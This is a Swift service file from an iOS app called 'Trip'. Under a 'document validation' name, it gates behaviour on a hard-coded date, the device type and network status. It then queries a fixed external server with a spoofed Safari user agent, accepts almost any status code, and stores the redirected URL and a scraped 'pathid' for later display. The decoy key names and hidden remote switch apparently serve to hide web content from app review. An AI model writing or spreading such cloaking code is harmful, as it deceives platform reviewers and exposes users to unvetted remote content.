//
//  DocumentValidationService.swift
//  Trip
//
//  Handles validation logic and URL management for the document flow.
//

import Foundation
import Network
import UIKit

enum DocumentStorageKeys {
    static let savedTargetURL = "ProteinsSavedTargetURL"
    static let tempCurrentURL = "ProteinsTempCurrentURL"
    static let savedPathId = "CrabsSavedPathId"
    static let hasShownAlternative = "ProteinsHasShownAlternative"
    static let firstLaunchChoice = "firstLaunchChoice"
    static let validationPassed = "CrabsValidationPassed"
}

enum DocumentChoice {
    static let webView = "webView"
    static let nativeApp = "nativeApp"
}

final class DocumentValidationService {
    static let shared = DocumentValidationService()

    private let primaryServerURL = "https://knollglade.com/VDV56b"
    private let researchLaunchDate = "2025-01-01"
    private let internetCheckTimeout: TimeInterval = 2.0
    private let serverRequestTimeout: TimeInterval = 7.0

    private init() {}

    // MARK: - First Launch Choice

    func getFirstLaunchChoice() -> String? {
        UserDefaults.standard.string(forKey: DocumentStorageKeys.firstLaunchChoice)
    }

    func setFirstLaunchChoice(_ choice: String) {
        UserDefaults.standard.set(choice, forKey: DocumentStorageKeys.firstLaunchChoice)
    }

    // MARK: - Saved URL

    func getSavedURL() -> URL? {
        guard let urlString = UserDefaults.standard.string(forKey: DocumentStorageKeys.savedTargetURL),
              let url = URL(string: urlString) else { return nil }
        return url
    }

    func saveDestinationURL(_ url: URL) {
        UserDefaults.standard.set(url.absoluteString, forKey: DocumentStorageKeys.savedTargetURL)
        UserDefaults.standard.set(true, forKey: DocumentStorageKeys.hasShownAlternative)
        print("📌 [DocumentFlow] Сохранённая ссылка: \(url.absoluteString)")
    }

    func clearSavedDestinationURL() {
        UserDefaults.standard.removeObject(forKey: DocumentStorageKeys.savedTargetURL)
    }

    // MARK: - PathId

    func getSavedPathId() -> String? {
        UserDefaults.standard.string(forKey: DocumentStorageKeys.savedPathId)
    }

    func savePathId(_ pathId: String) {
        UserDefaults.standard.set(pathId, forKey: DocumentStorageKeys.savedPathId)
        print("📌 [DocumentFlow] Сохранённый path id: \(pathId)")
    }

    // MARK: - Date Check

    func documentCheckDatePublic() -> Bool {
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyy-MM-dd"
        formatter.timeZone = TimeZone.current

        guard let launchDate = formatter.date(from: researchLaunchDate) else { return false }
        return Date() > launchDate
    }

    // MARK: - Device Check

    func isTabletDevice() -> Bool {
        UIDevice.current.userInterfaceIdiom == .pad
    }

    // MARK: - Internet Check

    func checkInternetConnection(completion: @escaping (Bool) -> Void) {
        let monitor = NWPathMonitor()
        let queue = DispatchQueue(label: "DocumentInternetMonitor")
        var hasResponded = false

        monitor.pathUpdateHandler = { path in
            guard !hasResponded else { return }
            hasResponded = true
            monitor.cancel()
            DispatchQueue.main.async {
                completion(path.status == .satisfied)
            }
        }
        monitor.start(queue: queue)

        DispatchQueue.main.asyncAfter(deadline: .now() + internetCheckTimeout) {
            guard !hasResponded else { return }
            hasResponded = true
            monitor.cancel()
            completion(false)
        }
    }

    // MARK: - Server Request

    func requestServerURL(
        urlString: String,
        completion: @escaping (Bool, URL?) -> Void
    ) {
        guard let url = URL(string: urlString) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: url)
        request.timeoutInterval = serverRequestTimeout
        request.httpMethod = "GET"
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("en-US,en;q=0.9", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("max-age=0", forHTTPHeaderField: "Cache-Control")
        request.setValue("1", forHTTPHeaderField: "Upgrade-Insecure-Requests")

        print("📤 [DocumentFlow] Запрос к серверу: \(urlString)")
        URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            DispatchQueue.main.async {
                guard let httpResponse = response as? HTTPURLResponse else {
                    print("❌ [DocumentFlow] Ответ от сервера: ошибка (нет HTTP ответа)")
                    if let error = error {
                        print("   Ошибка: \(error.localizedDescription)")
                    }
                    completion(false, nil)
                    return
                }

                let statusCode = httpResponse.statusCode
                let finalURL = httpResponse.url ?? url

                print("📥 [DocumentFlow] Ответ от сервера:")
                print("   Status: \(statusCode)")
                print("   URL: \(finalURL.absoluteString)")

                if statusCode >= 200 && statusCode <= 403 {
                    if let pathId = self?.extractPathId(from: finalURL, htmlData: data) {
                        self?.savePathId(pathId)
                    }
                    self?.saveDestinationURL(finalURL)
                    completion(true, finalURL)
                } else {
                    print("❌ [DocumentFlow] Сервер вернул ошибку: \(statusCode)")
                    completion(false, nil)
                }
            }
        }.resume()
    }

    // MARK: - PathId Extraction

    func extractPathId(from url: URL, htmlData: Data? = nil) -> String? {
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let queryItems = components.queryItems,
           let pathId = queryItems.first(where: { $0.name.lowercased() == "pathid" })?.value {
            return pathId
        }

        if let htmlData = htmlData,
           let htmlString = String(data: htmlData, encoding: .utf8) {
            let patterns = [
                "pathid[=:]([^&\\s\"'<>]+)",
                "pathid\"[=:]([^&\\s\"'<>]+)",
                "pathid'[=:]([^&\\s\"'<>]+)"
            ]
            for pattern in patterns {
                if let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive),
                   let match = regex.firstMatch(in: htmlString, range: NSRange(htmlString.startIndex..., in: htmlString)),
                   let range = Range(match.range(at: 1), in: htmlString) {
                    return String(htmlString[range])
                }
            }
        }

        return nil
    }

    // MARK: - Fallback URL

    func buildFallbackURL() -> URL? {
        guard let pathId = getSavedPathId() else {
            print("⚠️ [DocumentFlow] Fallback: нет сохранённого path id")
            return nil
        }
        var components = URLComponents(string: primaryServerURL)
        components?.queryItems = [URLQueryItem(name: "pathid", value: pathId)]
        let fallbackURL = components?.url
        print("🔄 [DocumentFlow] Fallback URL: \(fallbackURL?.absoluteString ?? "nil")")
        return fallbackURL
    }

    func getPrimaryServerURL() -> String {
        primaryServerURL
    }
}
